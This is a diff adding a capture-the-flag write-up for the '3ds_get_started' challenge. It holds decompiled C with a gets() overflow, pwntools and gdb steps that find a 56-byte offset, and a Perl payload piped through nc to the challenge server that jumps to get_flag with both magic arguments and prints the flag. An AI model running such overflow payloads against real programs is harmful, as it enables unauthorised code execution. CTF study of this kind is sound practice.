@@ -1,0 +1,82 @@
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4; // [sp+4h] [bp-38h]@1
+
+  printf("Qual a palavrinha magica? ", v4);
+  gets(&v4);
+  return 0;
+}
+
+void __cdecl get_flag(int a1, int a2)
+{
+  int v2; // eax@3
+  int v3; // esi@3
+  unsigned __int8 v4; // al@3
+  int v5; // ecx@4
+  unsigned __int8 v6; // al@5
+
+  if ( a1 == 814536271 && a2 == 425138641 )
+  {
+    v2 = fopen("flag.txt", "rt");
+    v3 = v2;
+    v4 = getc(v2);
+    if ( v4 != 255 )
+    {
+      v5 = (char)v4;
+      do
+      {
+        putchar(v5);
+        v6 = getc(v3);
+        v5 = (char)v6;
+      }
+      while ( v6 != 255 );
+    }
+    fclose(v3);
+  }
+}
+
+########################################################
+root@kali:~/ctf# python
+Python 2.7.12rc1 (default, Jun 13 2016, 09:20:59) 
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *
+>>> cyclic(200)
+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
+
+########################################################
+root@kali:~/ctf# gdb 3ds_get_started 
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/ctf/3ds_get_started 
+Qual a palavrinha magica? aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6161616f in ?? ()
+(gdb) 
+########################################################
+>>> cyclic(200).find(p32(0x6161616f))
+56
+
+########################################################
+(gdb) disassemble get_flag
+Dump of assembler code for function get_flag:
+   0x080489a0 <+0>:	push   %esi
+   0x080489a1 <+1>:	sub    $0x8,%esp
+
+########################################################
+>>> p32(0x080489a0)
+'\xa0\x89\x04\x08'
+>>> p32(814536271)
+'O\xd6\x8c0'
+>>> p32(425138641)
+'\xd1\x19W\x19'
+
+########################################################
+iits@zjnbwangwm1z-PC ~/desktop/3dsctf
+$ (perl -e 'print "A"x56,"\xa0\x89\x04\x08","aaaa", "O\xd6\x8c0", "\xd1\x19W\x19", "\n"'; cat) |  nc 54.175.35.248 8005
+Qual a palavrinha magica? 3DS{b0f_pr4_c0m3c4r_n3}
+
+Segmentation fault (core dumped)
+
